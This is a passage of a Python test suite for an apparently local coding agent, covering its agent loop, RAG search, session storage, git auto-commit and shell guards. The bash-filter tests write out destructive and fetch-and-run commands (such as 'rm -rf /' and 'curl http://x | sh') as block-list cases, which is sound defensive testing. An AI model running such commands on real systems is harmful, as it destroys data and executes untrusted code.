            return '```tool\n{"tool": "skill", "name": "DeepSeek-R1", "description": "AI assistant"}\n```', 10
        return '```tool\n{"tool": "skill", "name": "DeepSeek-R1"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "identical call repeated" in out, f"not-found repeat not blocked: {out[:400]}"
    assert calls["n"] == 2, f"expected 2 calls then block, got {calls['n']}"
    print("  [OK] agent loop: not-found repeat blocked")

def test_model_marker_text_stripped():
    """Model prose containing fake [PLAN]/[CONFIRM] markers must be cleaned."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ("I am an AI.\n[PLAN]\n1. step1\n\nReply 'yes' to execute plan.\n[CONFIRM] allow?\n", 10)
        return "final plain answer", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "[PLAN]" not in out, f"fake marker leaked: {out[:400]}"
    assert "Reply 'yes'" not in out, f"fake confirm leaked: {out[:400]}"
    assert "final plain answer" in out
    print("  [OK] agent loop: fake markers stripped from model text")

def test_short_question_skips_planner():
    """Short first message (simple question) must go straight to the main
    model — the planner wastes iterations on chat."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "plain answer", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "hi"}], None)
        short_model = calls[0]
        calls.clear()
        long_q = "Please implement a bubble sort function in python with unit tests " + ("x" * 200)
        agent_mod.run_agent_loop([{"role": "user", "content": long_q}], None)
        long_model = calls[0]
    finally:
        agent_mod.call_ollama = original
    assert short_model == agent_mod.MODEL, f"short question must use main model, got {short_model}"
    assert long_model == agent_mod.PLANNER_MODEL, f"long task must use planner, got {long_model}"
    print("  [OK] agent loop: short question skips planner")

def test_plan_trivial_steps_guard():
    """Plan with only 'step1/step2' placeholders must be rejected as trivial."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "plan", "steps": ["step1", "step 2"]}\n```', 10
        return "plain answer", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "trivial" in out, f"trivial plan not rejected: {out[:300]}"
    assert "plain answer" in out
    print("  [OK] agent loop: trivial plan guard")

def test_unknown_tool_hint():
    """Unknown tool must return the list of available tools."""
    from tools import execute_tool
    r = execute_tool("fix", {"file": "x.py"})
    assert "Unknown tool" in r and "fix" in r, f"bad error: {r[:120]}"
    assert "Available tools:" in r, f"no tool list in error: {r[:200]}"
    assert "edit" in r and "write" in r
    print("  [OK] tools: unknown tool hint with available list")

def test_rag_search_via_execute():
    """Bug: execute_tool('search') crashed with 'attempted relative import'.
    Must work through the public API after init."""
    import tools
    import rag
    rag.RAG_INDEX = None
    rag.RAG_CHUNKS = []
    rag.RAG_DIRTY = True
    rag.RAG_CACHE_DIR = None
    rag.init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
    r = tools.execute_tool("search", {"query": "how are sessions saved", "top_k": 2})
    assert "Error: attempted relative" not in r, f"relative import bug back: {r[:200]}"
    assert not r.startswith("Error"), f"search error: {r[:200]}"
    assert "agent.py" in r or "sqlite" in r or "sessions" in r, f"unexpected result: {r[:200]}"
    print("  [OK] tools: search via execute_tool (no relative import crash)")

def test_read_notfound_similar_files():
    """read of a missing path must suggest nearby files so the model can fix the path."""
    from tools import execute_tool
    f = WORK_DIR / ".test_tmp" / "similar_probe.py"
    f.write_text("x = 1", "utf-8")
    try:
        r = execute_tool("read", {"path": ".test_tmp/similar_prob.py"})
        assert "not found" in r, f"bad error: {r[:150]}"
        assert "similar_probe.py" in r, f"no similar-file hint: {r[:250]}"
    finally:
        f.unlink(missing_ok=True)
    print("  [OK] tools: read not-found suggests similar files")

def test_repeated_tool_blocked():
    """Identical tool call repeated twice in a row must be blocked (anti-loop)."""
    import agent as agent_mod
    f = WORK_DIR / "repeat_target.txt"
    f.write_text("content here", "utf-8")
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "read", "path": "repeat_target.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read it"}], None)
    finally:
        agent_mod.call_ollama = original
        f.unlink(missing_ok=True)
    assert "identical call repeated" in out, f"repeat not blocked: {out[:300]}"
    assert calls["n"] == 2, f"expected 2 iterations then block, got {calls['n']}"
    print("  [OK] agent loop: identical repeat blocked")

def test_missing_tool_key_stops_loop():
    """Broken blocks (no 'tool' key) repeated twice in a row must stop the loop."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return ("```tool\n{}\n```\n```tool\n{}\n```\n```tool\n{}\n```", 10)
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "do it"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "identical call repeated" in out, f"broken blocks not blocked: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after broken blocks, got {calls['n']} calls"
    print("  [OK] agent loop: broken tool blocks blocked")

def test_timeout_env():
    """AGENT_TIMEOUT must cap the loop and return a TIMEOUT marker."""
    import agent as agent_mod
    import time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.3)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    os.environ["AGENT_TIMEOUT"] = "0.05"
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read x"}], None)
    finally:
        agent_mod.call_ollama = original
        os.environ.pop("AGENT_TIMEOUT", None)
    assert "TIMEOUT" in out, f"timeout marker missing: {out[:200]}"
    assert calls["n"] == 1, f"loop should stop before 2nd call, got {calls['n']}"
    print("  [OK] agent loop: timeout respected")

def test_cancel_flag():
    """Cancel flag must stop the agent loop between iterations."""
    import agent as agent_mod
    import threading, time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.5)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    sid = "cancel_test"
    agent_mod._cancel_clear(sid)
    out = {}
    def worker():
        out["r"] = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], sid)
    t = threading.Thread(target=worker)
    try:
        t.start()
        _time.sleep(0.15)
        agent_mod._cancel_set(sid)
        t.join(timeout=10)
    finally:
        agent_mod.call_ollama = original
        agent_mod._cancel_clear(sid)
    assert not t.is_alive(), "loop did not stop after cancel"
    assert "[cancelled]" in out.get("r", ""), f"cancel marker missing: {out.get('r','')[:200]}"
    print(f"  [OK] agent loop: cancel flag respected ({calls['n']} calls)")

def test_rag_split_chunk():
    """Size-based chunking with overlap (DeepSeek P1)."""
    from rag import _split_chunk
    t = "x" * 1300
    parts = _split_chunk(t, 500, 80)
    assert len(parts) == 3, len(parts)
    assert all(len(p) <= 500 for p in parts)
    assert parts[0] == "x" * 500 and len(parts[-1]) == 460
    assert parts[0][420:] == parts[1][:80], "overlap missing"
    assert _split_chunk("short", 500, 80) == ["short"]
    print("  [OK] rag split chunk (size + overlap)")

def test_session_search():
    """Full-text search across session messages."""
    import agent as agent_mod
    sid = "srch_" + str(int(time.time()))
    agent_mod.save_session(sid, "Search me",
        [{"role": "user", "content": "Как работает потоковый SSE в агенте?"}])
    try:
        import api_sessions
        res = api_sessions.search_sessions(q="потоковый")
        assert any(r["id"] == sid for r in res), f"not found: {res}"
        r = next(r for r in res if r["id"] == sid)
        assert r["snippets"] and "потоковый" in r["snippets"][0]
        assert api_sessions.search_sessions(q="несуществующеесловоxyz") == []
    finally:
        agent_mod.delete_session_db(sid)
    print("  [OK] session full-text search")

def test_agent_loop_shell_alias():
    """Integration: 'shell' alias maps to bash and executes."""
    import agent as agent_mod
    def mock_ollama(msgs, model):
        return '```tool\n{"tool": "shell", "cmd": "echo alias_ok"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "echo"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "alias_ok" in out, f"alias result missing: {out[:300]}"
    print("  [OK] agent loop: shell alias -> bash")

def test_agent_loop_error_nudge():
    """After a tool error the model got prose: a system nudge must force it back to tool format."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ('```tool\n{"tool": "read", "path": "/path/to/agents.json"}\n```', 10)
        if calls["n"] == 2:
            return "Let me give you a tutorial about JSON storage...", 10
        if calls["n"] == 3:
            assert any(m.get("role") == "system" and "corrected" in m.get("content", "")
                       for m in msgs), "missing system nudge after tool error"
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "The files are listed above.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read agents.json and list"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "The files are listed above." in out, f"final missing: {out[:300]}"
    assert "Let me give you a tutorial" not in out, f"tutorial leaked into output: {out[:300]}"
    print("  [OK] agent loop: tool-error nudge back to tool format")

def test_ensure_safe_path_invented():
    """Absurd/invented absolute paths are rejected with an explicit hint."""
    from tools import execute_tool
    for p in ("/path/to/agents.json", "/tmp/x.py", "/home/u/f.py",
              "C:\\Windows\\System32\\drivers\\etc\\hosts"):
        r = execute_tool("read", {"path": p})
        assert "looks invented" in r, f"path {p} not blocked: {r[:150]}"
        assert "list/glob" in r, f"hint missing for {p}: {r[:150]}"
    print("  [OK] ensure_safe_path: invented paths blocked with hints")

def test_code_detector_nudge():
    """Prose containing code (def/class/import) without a tool block must trigger
    a 'use the write tool' system nudge, then the model writes the file."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return "Here is the code:\ndef add(a, b):\n    return a + b", 10
        if calls["n"] == 2:
            assert any(m.get("role") == "system" and "write" in m.get("content", "")
                       for m in msgs), "missing code->write nudge"
            return '```tool\n{"tool": "write", "path": "code_detect_demo.py", "content": "def add(a, b):\\n    return a + b"}\n```', 10
        return "File written and verified.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = True  # auto-execute write so the loop reaches the final answer
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a function add"}], None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
    assert "File written and verified." in out, f"final missing: {out[:200]}"
    print("  [OK] agent loop: code detector nudge -> write tool")

def test_rag_fast_search():
    """Vectorized search (FAISS/numpy) returns ranked chunks and survives rebuilds."""
    import rag
    import unittest.mock as um
    import json as _json
    rag.RAG_INDEX = None
    rag.RAG_CHUNKS = []
    rag.RAG_DIRTY = True
    rag.RAG_CACHE_DIR = None
    rag.FAISS_INDEX = None
    rag.RAG_MAX_CHUNKS = 10
    rag.init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
    rag.RAG_CHUNKS = [
        {"text": "session storage sqlite", "file": "a.py", "line": 1, "emb": [1.0, 0.0, 0.5], "_toks": []},
        {"text": "network request handler", "file": "b.py", "line": 3, "emb": [0.0, 1.0, 0.2], "_toks": []},
    ]
    rag.RAG_INDEX = [c["emb"] for c in rag.RAG_CHUNKS]
    rag._rebuild_fast_index()
    assert rag.FAISS_INDEX is not None, "fast index not built"
    def fake_embed(*a, **k):
        class R:
            def json(self):
                return {"embeddings": [[1.0, 0.0, 0.5]]}
        return R()
    with um.patch("rag.requests.post", side_effect=fake_embed):
        out = rag.rag_search("sqlite storage", top_k=1)
    assert "a.py" in out, f"wrong top result: {out}"
    # memory cap must not crash the pipeline
    rag.RAG_CHUNKS.append({"text": "x", "file": "c.py", "line": 0, "emb": [0.0, 0.0, 0.1], "_toks": []})
    rag.rag_index()
    assert len(rag.RAG_CHUNKS) <= 10, f"cap not applied: {len(rag.RAG_CHUNKS)}"
    print("  [OK] rag: FAISS/numpy fast path + memory cap")

def test_sessions_sqlite():
    """CRUD on sessions via SQLite storage (with JSON fallback)."""
    from fastapi.testclient import TestClient
    import agent as agent_mod, shutil
    tmp_sessions = WORK_DIR / ".test_sess"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        client = TestClient(agent_mod.app)
        r = client.post("/api/sessions", json={"title": "SQLite test"})
        assert r.status_code == 200, f"create: {r.status_code} {r.text}"
        sid = r.json()["id"]
        assert client.post("/api/sessions", json={}).status_code == 200
        # save messages
        assert agent_mod.save_session(sid, "SQLite test",
            [{"role": "user", "content": "hello"}, {"role": "assistant", "content": "hi"}]), "save failed"
        s = agent_mod.load_session(sid)
        assert s and s["title"] == "SQLite test" and len(s["messages"]) == 2, f"load: {s}"
        r = client.get(f"/api/sessions/{sid}")
        assert r.json()["messages"][1]["content"] == "hi", f"get: {r.json()}"
        assert (tmp_sessions / "sessions.db").exists(), "db file missing"
        # list + export
        r = client.get("/api/sessions")
        assert any(x["id"] == sid for x in r.json()), f"list missing session: {r.json()}"
        r = client.get(f"/api/sessions/{sid}/export")
        assert r.json()["messages"], "export empty"
        # delete
        assert client.delete(f"/api/sessions/{sid}").json().get("ok")
        assert agent_mod.load_session(sid) is None, "session not deleted"
        # import
        r = client.post("/api/sessions/import", json={"title": "imp", "messages": [{"role": "user", "content": "x"}]})
        assert r.json().get("id"), "import failed"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions SQLite CRUD")

def test_session_json_migration():
    """Legacy JSON session files are imported into SQLite."""
    import agent as agent_mod, shutil, json as json_mod
    tmp_sessions = WORK_DIR / ".test_migr"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        legacy = tmp_sessions / "legacy_1.json"
        legacy.write_text(json_mod.dumps(
            {"title": "Legacy", "messages": [{"role": "user", "content": "old"}],
             "updated": "2026-01-01T00:00:00"}, ensure_ascii=False), "utf-8")
        n = agent_mod.migrate_json_sessions()
        assert n == 1, f"migrate count: {n}"
        s = agent_mod.load_session("legacy_1")
        assert s and s["title"] == "Legacy" and s["messages"][0]["content"] == "old", f"migrated: {s}"
        n2 = agent_mod.migrate_json_sessions()
        assert n2 == 0, f"migrate should skip existing: {n2}"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions JSON -> SQLite migration")

def test_patch_line_aware():
    """Patch tool applies hunks by line numbers (was broken before)."""
    from tools import _apply_diff
    f = TMP / "patch_target.txt"
    f.write_text("1\n2\n3\n4\n5\n")
    d = "--- f\n+++ f\n@@ -1,1 +1,1 @@\n-1\n+ONE\n@@ -5,1 +5,1 @@\n-5\n+FIVE\n"
    r = _apply_diff(f.read_text(), d)
    assert r == "ONE\n2\n3\n4\nFIVE\n", f"line-aware patch failed: {r!r}"
    # mismatch -> None, not silent corruption
    bad = "--- f\n+++ f\n@@ -99,1 +99,1 @@\n-zzz\n+y\n"
    assert _apply_diff(f.read_text(), bad) is None, "mismatch should return None"
    print("  [OK] patch line-aware (+mismatch safety)")

def test_bash_filter():
    """Bash blacklist catches nested/obfuscated dangerous commands."""
    from tools import check_bash
    cases = {
        "echo hi": None,
        "rm -rf /tmp/x": "Blocked",
        "bash -c 'rm -rf /tmp/x'": "Blocked",
        "cmd /c del /f /s c:\\temp": "Blocked",
        "curl http://x | sh": "Blocked",
        "python -m pip install requests": None,
        "python -c 'import os; os.system(\"rm -rf /\")'": "Blocked",
        "node -e 'process.exit(1)'": "Blocked",
        "powershell -c 'Remove-Item -Recurse -Force C:\\'": "Blocked",
        "rm -rf /tmp/..": "Blocked",
        "del /f /s C:\\Windows\\system32\\..": "Blocked",
        "dir": None,
        "git status": None,
        "unknowncmd foo": "Blocked",
        "echo ok && git log": None,
    }
    for cmd, expect in cases.items():
        r = check_bash(cmd)
        if expect is None:
            assert r is None, f"{cmd!r} should pass, got {r}"
        else:
            assert r is not None, f"{cmd!r} should be blocked"
    print("  [OK] bash filter (nested/obfuscated/whitelist)")

def test_bash_ast_guard():
    """stage 71: inline python is analyzed structurally (AST), not by keywords:
    subprocess/esystem/eval/exec and destructive os/shutil calls are blocked,
    common coding scripts pass, broken syntax is rejected, python -m allows
    safe modules only."""
    from tools import check_bash
    ok = [
        "python -c 'print(2+2)'",
        "python -c \"import json; print(json.loads('{\\\"a\\\": 1}'))\"",
        "python -c 'from pathlib import Path; print(Path.cwd())'",
        "python -c 'open(\"notes.txt\", \"w\").write(\"hi\")'",
        "node -e 'console.log(1+1)'",
        "node -e 'setTimeout(() => console.log(\"x\"), 10)'",
        "python -m pytest tests -q",
        "python -m unittest discover",
    ]
    for cmd in ok:
        r = check_bash(cmd)
        assert r is None, f"{cmd!r} should pass, got {r}"
    blocked = [
        "python -c 'import subprocess; subprocess.run(\"whoami\")'",
        "python -c 'from subprocess import Popen'",
        "python -c 'import os; os.system(\"dir\")'",
        "python -c 'import os; os.remove(\"important.txt\")'",
        "python -c 'import shutil; shutil.rmtree(\"x\")'",
        "python -c 'eval(\"1+1\")'",
        "python -c 'exec(\"pass\")'",
        "python -c 'def broken(:'",
        "python -c 'import socket; socket.connect((\"h\", 1))'",
        "node -e 'require(\"child_process\").exec(\"dir\")'",
        "node -e 'process.binding(\"fs\")'",
        "python -m http.server 8000",
    ]
    for cmd in blocked:
        r = check_bash(cmd)
        assert r is not None, f"{cmd!r} should be blocked"
    print("  [OK] bash AST guard (inline python/node structural checks)")

def test_todo_thread_safety():
    """todo tool works under concurrent access."""
    import threading
    from tools import execute_tool, TODO_LIST
    TODO_LIST.clear()
    errs = []
    def worker(n):
        for i in range(20):
            try:
                r = execute_tool("todo", {"action": "add", "items": [f"item{n}-{i}"]})
                if "Added" not in r: errs.append(r)
            except Exception as e:
                errs.append(str(e))
    threads = [threading.Thread(target=worker, args=(t,)) for t in range(4)]
    for t in threads: t.start()
    for t in threads: t.join()
    assert not errs, f"todo errors: {errs[:3]}"
    assert len(TODO_LIST) == 80, f"todo lost items: {len(TODO_LIST)}"
    TODO_LIST.clear()
    print("  [OK] todo thread safety")

def test_sess_stats_advice():
    """Failed tools accumulate in per-session stats and the advice appears in
    the dynamic context of the next model call."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        if len(calls) == 1:
            return '```tool\n{"tool": "read", "path": "missing_xyz_advice.txt"}\n```', 10
        return "I could not read the file. There is nothing more to do.", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "read the file"}], None)
    finally:
        agent_mod.call_ollama = original
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "Tool errors this session" in m.get("content", "")]
    assert dyn, "session tool-error advice missing"
    assert "read: 1 error(s)" in dyn[-1]["content"], dyn[-1]["content"]
    assert "use glob or list to find the real path" in dyn[-1]["content"], dyn[-1]["content"]
    print("  [OK] per-session tool-error advice in dynamic context")

def test_model_router():
    """A user-selected model is never routed away: all calls keep the chosen model."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "A friendly reply without any tool blocks.", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "do the thing"}], None,
                                 model="bad_model_x")
    finally:
        agent_mod.call_ollama = original
    assert calls, "model never called"
    assert set(calls) == {"bad_model_x"}, f"user model was routed away: calls={calls}"
    print("  [OK] user-selected model is never routed to another model")

def test_rag_status_api():
    """GET /api/rag/status returns the RAG indexing progress dict."""
    import agent as agent_mod
    from fastapi.testclient import TestClient
    client = TestClient(agent_mod.app)
    r = client.get("/api/rag/status")
    assert r.status_code == 200, f"status: {r.status_code} {r.text}"
    d = r.json()
    assert d["phase"] in ("idle", "indexing"), d
    assert isinstance(d["chunks"], int) and d["files_done"] >= 0, d
    assert "updated" in d, d
    print("  [OK] /api/rag/status payload")

def test_audit_api():
    """GET /api/audit returns recent lines of the action audit log."""
    import agent as agent_mod
    from fastapi.testclient import TestClient
    client = TestClient(agent_mod.app)
    r = client.get("/api/audit?limit=3")
    assert r.status_code == 200, f"audit: {r.status_code} {r.text}"
    d = r.json()
    assert "lines" in d, d
    assert len(d["lines"]) <= 3, f"limit not applied: {len(d['lines'])}"
    r2 = client.get("/api/audit?limit=abc")
    assert r2.status_code == 200, f"bad limit should fall back: {r2.text}"
    print("  [OK] /api/audit endpoint")

def test_cli_main():
    """python -m myopencode runs the agent loop headlessly with NO_CONFIRM."""
    import myopencode as cli
    calls = []
    def fake_loop(msgs, session_id, **kw):
        calls.append((msgs, session_id))
        return "built hello.py"
    old = cli.run_agent_loop
    cli.run_agent_loop = fake_loop
    try:
        assert cli.main(["create hello.py"]) == 0
        assert cli.main([]) == 2, "no args should print usage and return 2"
    finally:
        cli.run_agent_loop = old
    assert len(calls) == 1 and calls[0][0][0]["content"] == "create hello.py", calls
    assert calls[0][1] is None, "CLI uses a fresh session"
    print("  [OK] CLI entry (python -m myopencode)")

def test_session_checkpoint():
    """Runtime state file marks interrupted runs; clean runs remove it."""
    import agent as agent_mod, shutil
    tmp_sessions = WORK_DIR / ".test_cp"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        sid = "cp-test"
        agent_mod.save_session(sid, "CP", [{"role": "user", "content": "hi"}])
        assert not agent_mod.session_interrupted(sid), "no state file -> not interrupted"
        sp = agent_mod._state_path(sid)
        sp.write_text('{"running": true}')
        import os as os_mod
        os_mod.utime(sp, (time.time() - 200, time.time() - 200))
        assert agent_mod.session_interrupted(sid), "stale state -> interrupted"
        old = sp.stat().st_mtime
        sp.write_text('{"running": true}')
        assert not agent_mod.session_interrupted(sid), "fresh state -> running, not interrupted"
        sp.unlink()
        # loop creates the marker and removes it on clean finish
        calls = []
        def mock_ollama(msgs, model):
            calls.append(model)
            return "plain text answer without tools", 5
        orig = agent_mod.call_ollama
        agent_mod.call_ollama = mock_ollama
        try:
            agent_mod.run_agent_loop([{"role": "user", "content": "long task to avoid planner skip"}], sid)
        finally:
            agent_mod.call_ollama = orig
        assert not sp.exists(), "state file must be removed after a clean run"
        s = agent_mod.load_session(sid)
        assert s and s["messages"], f"checkpoint/save failed: {s}"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] session checkpoint + interrupted marker")

def test_git_auto_commit():
    """write/edit/patch auto-commit into an agent branch (GIT_AUTO_COMMIT=1,
    GIT_AUTO_BRANCH=1) without touching the user's default branch."""
    import subprocess as _sp
    import shutil
    import sys as _sys
    _bk = _sys.modules["tools.backup"]
    def _force_rm(p):
        def _onerr(func, path, exc_info):
            try:
                os.chmod(path, 0o777)
                func(path)
            except OSError:
                pass
        if p.exists():
            shutil.rmtree(p, onerror=_onerr)
    repo = (TMP / "git_auto_repo").resolve()
    for _ in range(30):
        try:
            _force_rm(repo)
            repo.mkdir(parents=True)
            break
        except OSError:
            time.sleep(0.2)
    assert repo.exists() and not (repo / ".git").exists(), "temp repo cleanup failed"
    _sp.run(["git", "init", "-q", "-b", "main"], cwd=str(repo), check=True)
    _sp.run(["git", "config", "user.email", "t@t"], cwd=str(repo))
    _sp.run(["git", "config", "user.name", "t"], cwd=str(repo))
    (repo / "base.txt").write_text("base\n")
    _sp.run(["git", "add", "."], cwd=str(repo))
    _sp.run(["git", "commit", "-q", "-m", "base"], cwd=str(repo))
    from tools import _state as _st
    old_wd, old_ac, old_ab = _st.WORK_DIR, _st.GIT_AUTO_COMMIT, _st.GIT_AUTO_BRANCH
    old_bk = _bk.WORK_DIR, _bk.BACKUP_DIR
    try:
        _st.WORK_DIR = repo; _st.GIT_AUTO_COMMIT = True; _st.GIT_AUTO_BRANCH = True
        _bk.WORK_DIR = repo
        _bk.BACKUP_DIR = repo / ".agent_backups"; _bk.BACKUP_DIR.mkdir(exist_ok=True)
        r = execute_tool("write", {"path": str(repo / "a.py"), "content": "x = 1\n"})
        if "git:" not in r:
            dbg = _sp.run(["git", "status", "--short", "--branch"], cwd=str(repo),
                          capture_output=True, text=True).stdout
            dbg2 = _sp.run(["git", "log", "--oneline", "-3"], cwd=str(repo),
                           capture_output=True, text=True).stdout
            raise AssertionError(f"no auto-commit: {r}\n{dbg}\n{dbg2}")
        assert "committed" in r, f"auto-commit malformed: {r}"
        branch = _sp.run(["git", "rev-parse", "--abbrev-ref", "HEAD"], cwd=str(repo),
                         capture_output=True, text=True).stdout.strip()
        assert branch.startswith("agent-session-"), f"not on agent branch: {branch}"
        r = execute_tool("edit", {"path": str(repo / "a.py"), "old": "x = 1", "new": "x = 2"})
        assert "git:" in r and "committed" in r, f"edit not committed: {r}"
        log = _sp.run(["git", "log", "--oneline", "-3"], cwd=str(repo),
                      capture_output=True, text=True).stdout
        assert log.count("agent:") >= 2, f"commit history wrong: {log}"
        main_log = _sp.run(["git", "log", "--oneline", "main", "-1"], cwd=str(repo),
                           capture_output=True, text=True).stdout
        assert "base" in main_log, "main history was touched"
    finally:
        _st.WORK_DIR, _st.GIT_AUTO_COMMIT, _st.GIT_AUTO_BRANCH = old_wd, old_ac, old_ab
        _bk.WORK_DIR, _bk.BACKUP_DIR = old_bk
        shutil.rmtree(repo, ignore_errors=True)
    print("  [OK] git auto-commit on agent branch (write+edit), main untouched")

def test_auto_pick_model():
    """Stage 25: qwen3:8b becomes default with >=10GB VRAM + installed, but an
    explicit AI_MODEL always wins."""
    import agent as agent_mod
    import os as _os
    old_env = _os.environ.pop("AI_MODEL", None)
    old_model = agent_mod.MODEL
    captured = {"cmds": []}
    def fake_run(cmd, **kw):
        captured["cmds"].append(cmd[0])
        class R:
            returncode = 0
            stdout = ""
            stderr = ""
        r = R()
        if cmd[0] == "ollama":
            r.stdout = "NAME  SIZE\nqwen3:8b  5.5GB\n"
        elif cmd[0] == "nvidia-smi":
            r.stdout = "12288\n"
        return r
    original_run = agent_mod.subprocess.run
    agent_mod.subprocess.run = fake_run
    try:
        agent_mod.MODEL = "qwen2.5-coder:7b"
        m = agent_mod._auto_pick_model()
        assert m == "qwen3:8b", f"big VRAM should pick qwen3:8b: {m}"

        agent_mod.MODEL = "qwen2.5-coder:7b"
        def fake_small(cmd, **kw):
            r = fake_run(cmd, **kw)
            if cmd[0] == "nvidia-smi":
                r.stdout = "4096\n"
            return r
        agent_mod.subprocess.run = fake_small
        m = agent_mod._auto_pick_model()
        assert m == "qwen2.5-coder:7b", f"small VRAM keeps default: {m}"

        _os.environ["AI_MODEL"] = "deepseek-coder-v2:16b"
        agent_mod.MODEL = "deepseek-coder-v2:16b"
        m = agent_mod._auto_pick_model()
        assert m == "deepseek-coder-v2:16b", "explicit AI_MODEL must win"
    finally:
        agent_mod.subprocess.run = original_run
        agent_mod.MODEL = old_model
        if old_env is None:
            _os.environ.pop("AI_MODEL", None)
        else:
            _os.environ["AI_MODEL"] = old_env
    print("  [OK] auto model pick: VRAM>=10GB -> qwen3:8b, explicit wins")

def test_docker_sandbox_flag():
    """Stage 26: DOCKER_SANDBOX=1 routes bash through docker_bash; without the
    flag (or with 0) it returns None -> local shell; detection is disabled by
    DOCKER_SANDBOX=0."""
    import core.safety.bash_guard as bg
    import os as _os
    old = {
        k: _os.environ.get(k)
        for k in ("BASH_DOCKER", "DOCKER_SANDBOX", "BASH_DOCKER_IMAGE")
    }
    _os.environ.pop("BASH_DOCKER", None)
    _os.environ.pop("DOCKER_SANDBOX", None)
    captured = []
    orig_which = bg.shutil.which
    orig_run = bg.subprocess.run
    def fake_run(dcmd, **kw):
        captured.append(dcmd[1])
        class R:
            returncode = 0
            stdout = "ok\n"
            stderr = ""
        return R()
    try:
        bg.shutil.which = lambda name: "C:\\docker.exe" if name == "docker" else None
        bg.subprocess.run = fake_run
        assert bg.docker_bash("echo hi", ".", 10) is None, "no flag -> local"
